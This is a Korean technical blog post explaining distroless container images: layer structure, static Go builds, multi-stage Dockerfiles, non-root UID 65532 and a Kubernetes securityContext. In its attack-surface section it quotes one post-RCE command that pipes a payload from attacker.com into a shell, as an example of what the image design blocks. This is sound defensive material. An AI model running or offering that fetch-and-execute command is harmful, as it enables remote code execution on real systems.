---
title: "distroless 컨테이너 이미지 — OS 패키지 없는 경량·보안 이미지의 원리"
excerpt: "distroless 이미지가 OS 패키지와 shell을 제거함으로써 어떻게 공격 표면을 줄이고 이미지 크기를 최소화하는지, 레이어 구조·multi-stage 빌드·non-root UID 배경을 중심으로 설명합니다"
category: kubernetes
tags:
  - go-ti
  - distroless
  - 컨테이너이미지
  - multi-stage빌드
  - 공격표면
  - concept
series:
  name: "goti-deepdive-runtime"
  order: 6
date: "2026-04-09"
---

## 한 줄 요약

> distroless 이미지는 OS 패키지 관리자·shell·유틸리티를 전부 제거하고 애플리케이션 바이너리와 최소 C 런타임만 남긴 컨테이너 베이스 이미지입니다 공격 표면을 극한까지 줄이고 이미지 크기를 수십 MB 수준으로 유지하는 것이 목적입니다

---

## 🤔 무엇을 푸는 기술인가

일반적인 컨테이너 베이스 이미지(`ubuntu`, `debian`, `alpine` 등)는 OS 전체 패키지 트리를 포함합니다 `bash`, `sh`, `curl`, `apt`, `apk`, 각종 시스템 라이브러리, cron, SSH 데몬 같은 도구들이 이미지 레이어 안에 존재합니다 이 중 대부분은 **애플리케이션이 실행되는 동안 전혀 사용되지 않습니다**

문제는 두 가지입니다

- **보안**: 사용하지 않는 패키지에서도 CVE(Common Vulnerabilities and Exposures)가 발생합니다 `curl`이나 `bash`에 신규 취약점이 공개될 때마다, 그 바이너리가 컨테이너 안에 있다면 스캐너가 경보를 냅니다 공격자가 코드 실행 권한을 얻었을 때 `bash`가 있으면 그 자리에서 명령을 실행할 수 있습니다
- **이미지 크기**: `debian:bullseye-slim`이 약 80MB, `ubuntu:22.04`가 약 77MB입니다 이 위에 JRE를 추가하면 270~300MB가 됩니다 이미지가 클수록 레지스트리 push/pull 시간이 길어지고, HPA 스케일아웃 시 새 Pod이 트래픽을 받기까지의 지연이 늘어납니다

**distroless**는 이 문제를 "처음부터 OS 패키지를 넣지 않는다"는 방식으로 해결합니다 `gcr.io/distroless`(Google Container Tools)와 `cgr.dev/chainguard`(Chainguard)가 대표적인 제공자입니다

---

## 🔧 동작 원리

### 일반 베이스 이미지의 레이어 구조

컨테이너 이미지는 **읽기 전용 레이어**의 스택입니다 `docker pull`이나 `skopeo inspect`로 확인하면, debian 기반 이미지는 레이어가 다음과 같은 내용을 포함합니다

```text
Layer 0  base-files, base-passwd   (OS 기반 파일)
Layer 1  libc6, libgcc-s1, ...     (C 런타임·시스템 라이브러리)
Layer 2  bash, coreutils, apt, ...  (shell·패키지 관리자)
Layer 3  curl, wget, ca-certificates, ...  (네트워크 도구)
...
Layer N  실제 애플리케이션 바이너리
```

JRE 기반 이미지(`eclipse-temurin:21-jre-jammy`)라면 레이어가 더 깊어집니다 JVM 클래스 파일, `javac`, `jshell`, JMX connector 같은 툴킷도 포함됩니다

이 구조에서 **레이어마다 CVE 표면이 누적됩니다** 이미지 스캐너(Trivy, Snyk 등)는 각 레이어에서 패키지 목록을 추출해 CVE 데이터베이스와 대조합니다 패키지가 많을수록 취약점 경보가 많습니다

### distroless 이미지의 레이어 구조

distroless 이미지는 레이어 내용이 근본적으로 다릅니다

```text
Layer 0  ca-certificates, tzdata    (TLS 인증서·시간대)
Layer 1  libc6, libssl, ...         (C 런타임·최소 의존성만)
Layer 2  /etc/passwd, /tmp, /home   (최소 파일시스템 엔트리)
```

`bash`, `sh`, `curl`, `apt`, `ls`, `cat` 같은 도구가 **없습니다** 디렉토리 구조는 표준 Linux와 같지만 그 안을 채우는 바이너리가 애플리케이션 코드 외에는 존재하지 않습니다

`gcr.io/distroless/static-debian12`는 C 런타임도 없는 순수 정적 링크 바이너리 전용 베이스입니다 `gcr.io/distroless/base-debian12`는 `libc6`를 포함해 동적 링크 바이너리도 수용합니다 Go의 정적 컴파일 바이너리는 `static` 변형을 사용하면 됩니다

![일반 JRE 이미지 레이어 vs distroless/static 이미지 레이어 비교|tall](/diagrams/goti-deepdive-distroless-container-image-1.svg)

위 다이어그램은 레이어 구조를 비교합니다 왼쪽은 `eclipse-temurin:21-jre` 기반 Java 이미지입니다 OS 베이스(Debian), C 런타임, 시스템 유틸리티(bash·apt·curl), JRE 클래스 파일·JVM, 마지막으로 애플리케이션 JAR까지 총 5~6 레이어가 쌓여 약 280MB에 달합니다 오른쪽은 `distroless/static-debian12:nonroot`를 베이스로 사용한 Go 바이너리 이미지입니다 ca-certificates·tzdata로 구성된 최소 레이어 하나와 정적 바이너리 단 하나만 존재합니다 전체 이미지가 약 20~50MB 수준입니다 레이어가 적다는 것은 그 안에서 발생할 수 있는 CVE 표면이 줄어든다는 의미입니다

### 정적 링크 바이너리와 distroless의 관계

distroless/static이 동작하려면 **애플리케이션 바이너리가 외부 라이브러리에 의존하지 않아야 합니다** Go는 기본적으로 단일 정적 바이너리로 컴파일됩니다

```bash
# Go 정적 빌드 확인
CGO_ENABLED=0 GOOS=linux go build -o app ./cmd/server
file app
# app: ELF 64-bit LSB executable, x86-64, statically linked
```

`CGO_ENABLED=0`으로 C 바인딩을 비활성화하면 생성된 바이너리는 `libc` 같은 동적 라이브러리 없이도 실행됩니다 이 바이너리를 `distroless/static`에 넣으면 별도 런타임 설치 없이 동작합니다

반면 Java, Python, Node.js는 각각 JVM, Python 인터프리터, Node 바이너리가 필요합니다 이들은 `distroless/static`이 아닌 `distroless/java21` 또는 `distroless/python3` 같은 언어별 변형을 사용합니다 이 변형들도 shell·패키지 관리자는 없지만 해당 런타임 자체는 포함합니다

### multi-stage 빌드 — 빌드 도구를 런타임 이미지에서 분리

distroless 이미지는 shell이 없어서 빌드 과정(`go build`, `javac`, `pip install`)을 실행할 수 없습니다 이 문제를 해결하는 것이 **multi-stage 빌드**입니다

```dockerfile
# Stage 1: 빌드
FROM golang:1.22-alpine AS builder
WORKDIR /app
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 GOOS=linux go build -trimpath -o server ./cmd/server

# Stage 2: 실행 이미지
FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=builder /app/server /server
ENTRYPOINT ["/server"]
```

`builder` 스테이지에서는 Go 컴파일러·빌드 도구가 포함된 `golang:alpine`을 사용해 바이너리를 생성합니다 최종 이미지는 `distroless/static-debian12:nonroot`를 베이스로 하고, 앞 스테이지에서 만들어진 바이너리만 `COPY --from=builder`로 가져옵니다 빌드 도구, 소스 코드, `go.mod`, 캐시 파일은 최종 이미지에 포함되지 않습니다

이 패턴이 중요한 이유는 다음과 같습니다

- 소스 코드와 빌드 시크릿(`.env`, 인증서)이 최종 이미지에 남지 않습니다
- 컴파일러·링커 자체에 있는 취약점이 런타임 이미지에 영향을 주지 않습니다
- 이미지 레이어가 빌드 캐시와 분리되어 최종 이미지가 항상 최소 크기를 유지합니다

### 공격 표면 축소 — shell이 없다는 의미

컨테이너 보안 사고의 대표적인 패턴은 **RCE(Remote Code Execution) 후 lateral movement**입니다 공격자가 애플리케이션 취약점으로 코드 실행 권한을 얻으면, 그다음 목표는 컨테이너 내부에서 추가 명령을 실행하거나 외부와 통신하는 것입니다

distroless 이미지에서는 이 단계가 대폭 어려워집니다

- `bash -c "curl attacker.com/payload | sh"` 실행 불가 — `bash`, `curl`, `sh` 없음
- 패키지 설치 불가 — `apt`, `apk`, `pip` 없음
- 파일시스템 탐색 도구 없음 — `ls`, `cat`, `find` 없음
- 네트워크 탐색 도구 없음 — `nc`, `wget`, `nmap` 없음

물론 애플리케이션 바이너리 자체에 취약점이 있다면 그 바이너리 내부의 syscall로 여전히 악의적인 동작이 가능합니다 distroless는 "취약점을 없애는" 기술이 아니라 "취약점 악용 시 공격자의 행동 반경을 줄이는" 기술입니다

### non-root UID — 65532의 의미

`distroless:nonroot` 태그가 붙은 이미지는 기본 실행 사용자가 UID 65532(`nonroot`)입니다 이와 달리 기본 태그는 root(UID 0)로 실행됩니다

Kubernetes에서 container가 root로 실행되면 컨테이너 탈출 시 노드 파일시스템에 대한 권한이 높아집니다 또한 Kubernetes `PodSecurityStandards`의 `restricted` 정책은 root 실행을 기본으로 거부합니다

```yaml
# Kubernetes Pod 보안 컨텍스트 설정
securityContext:
  runAsNonRoot: true
  runAsUser: 65532
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: true
  seccompProfile:
    type: RuntimeDefault
  capabilities:
    drop:
      - ALL
```

`nonroot` 태그 이미지와 위 `securityContext`를 조합하면 Kubernetes `restricted` 정책을 준수할 수 있습니다 go-ti는 이 조합을 전 서비스에 통일 적용했습니다

---

## 📐 세부 동작과 옵션

### distroless 이미지 변형 선택

주요 변형과 용도를 정리합니다

| 이미지 | 런타임 포함 | 용도 |
|--------|------------|------|
| `distroless/static-debian12` | 없음 (정적 바이너리 전용) | Go, Rust, C (정적 링크) |
| `distroless/base-debian12` | glibc·OpenSSL | C/C++ (동적 링크), CGO 사용 Go |
| `distroless/java21-debian12` | OpenJDK 21 JRE | Java 애플리케이션 |
| `distroless/python3-debian12` | CPython 3 | Python 애플리케이션 |
| `distroless/nodejs22-debian12` | Node.js 22 | Node.js 애플리케이션 |

각 변형에 `:nonroot` 접미사를 붙이면 기본 사용자가 UID 65532로 전환됩니다 `:debug` 접미사는 `busybox` shell을 포함한 디버그 전용 변형입니다 실제 공격 표면 감소를 원한다면 `:debug`는 프로덕션에 사용하지 않습니다

### 이미지 크기 비교

go-ti ADR에서 측정된 실제 수치입니다

| 베이스 이미지 | 대표 레이어 내용 | 이미지 크기 |
|--------------|----------------|------------|
| `eclipse-temurin:21-jre-jammy` | OS + JRE | ~280MB |
| `eclipse-temurin:21-jre-alpine` | Alpine + JRE | ~185MB |
| `distroless/java21-debian12:nonroot` | 최소 OS + JRE | ~120MB |
| `distroless/static-debian12:nonroot` | 최소 OS (런타임 없음) | ~2MB |
| Go 바이너리 포함 최종 이미지 | 위 base + 바이너리 | ~20~50MB |

Go의 정적 바이너리가 distroless/static과 결합하면 최종 이미지가 20~50MB 수준으로 유지됩니다 Java 최적화 이미지(`distroless/java21`)도 JRE를 포함해야 해서 120MB 수준입니다

### CVE 스캐닝 결과 차이

패키지가 적을수록 스캐너가 보고하는 CVE 건수가 줄어듭니다 그러나 주의할 점이 있습니다

- distroless 이미지 자체에 포함된 glibc·OpenSSL 같은 라이브러리에도 CVE가 발생합니다
- 애플리케이션 바이너리가 의존하는 Go 모듈이나 Java 라이브러리에도 CVE가 발생합니다
- distroless는 OS 레이어의 CVE를 줄이는 것이지, 애플리케이션 레이어의 CVE를 제거하지는 않습니다

Trivy나 Snyk 같은 스캐너에서 "OS packages" 카테고리 CVE가 대폭 줄어드는 효과가 있으며, "App packages" 카테고리는 별도 관리가 필요합니다

---

## 🧩 go-ti에서는

go-ti는 Java Spring Boot에서 Go로 전환하면서 `gcr.io/distroless/static-debian12:nonroot`를 전 서비스의 프로덕션 베이스 이미지로 채택했습니다 Java 대비 이미지 크기가 약 280MB에서 40MB 수준으로 7배 축소되었고, 이미지 pull 시간이 줄어 HPA 스케일아웃 시 새 Pod이 트래픽을 받기까지의 지연이 단축되었습니다 ADR에 기록된 측정 기준에서 최소 레플리카 기준 전체 메모리 요청은 약 2,300Mi에서 384Mi로 줄었으며, 이는 Go 정적 바이너리·distroless 이미지가 함께 기여한 결과입니다

multi-stage 빌드는 builder 스테이지에서 `CGO_ENABLED=0 go build`로 정적 바이너리를 생성하고, 최종 스테이지에서 distroless/static 위에 바이너리만 복사하는 단순 두 단계 패턴을 사용했습니다 컨테이너 내 shell이 없어 `kubectl exec` 로그인 기반 디버깅이 불가하므로, 트러블슈팅은 구조화된 로그(zap + OTel) 전적으로 의존합니다

> 이 기술을 go-ti에 도입하기까지의 의사결정 과정(Java → Go 전환 배경, 대안 언어 기각 근거, Istio canary 전환 방식)은
> [Java Spring Boot → Go 전환 아키텍처 결정](/logs/goti-java-to-go-migration-adr)에 정리했습니다

---

## 📚 핵심 정리

- **distroless = OS 패키지·shell 없는 최소 베이스**: 애플리케이션 바이너리와 최소 C 런타임(또는 언어 런타임)만 남기고 나머지를 제거합니다 공격자가 RCE를 얻어도 shell·네트워크 도구가 없어 행동 반경이 좁아집니다
- **multi-stage 빌드가 전제**: shell이 없으므로 빌드는 별도 스테이지에서 수행하고, 최종 이미지에는 바이너리만 `COPY --from`으로 가져옵니다 소스 코드·빌드 도구·인증서가 프로덕션 이미지에 남지 않습니다
- **Go 정적 바이너리와 가장 잘 맞는 조합**: `CGO_ENABLED=0` 빌드 결과물은 glibc 의존성이 없어 `distroless/static`(런타임 없음)과 결합하면 20~50MB 이미지가 됩니다
- **non-root UID 65532**: `:nonroot` 변형은 기본 실행 사용자를 root에서 65532로 전환합니다 Kubernetes `restricted` PodSecurityStandards 준수에 필요한 출발점입니다
- **CVE 감소는 OS 레이어 한정**: distroless는 OS 패키지 CVE를 줄입니다 애플리케이션·런타임 의존성 CVE는 별도 스캐닝과 업데이트가 여전히 필요합니다
